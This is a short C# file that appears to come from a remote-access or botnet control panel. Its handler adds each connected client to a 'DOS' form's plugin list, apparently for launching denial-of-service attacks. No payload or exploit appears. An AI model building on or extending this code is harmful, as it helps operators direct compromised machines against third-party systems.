﻿using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using ModernGUI_V3;
using ModernGUI_V3.Connection;
using MessagePackLib.MessagePack;

namespace ModernGUI_V3.Handle_Packet
{
    class HandleDos
    {
        public void Add(Clients client, MsgPack unpack_msgpack)
        {
            try
            {
                FormDOS DOS = (FormDOS)Application.OpenForms["DOS"];
                if (DOS != null)
                {
                    lock (DOS.sync)
                    DOS.PlguinClients.Add(client);
                }
            }
            catch { }
        }
    }
}
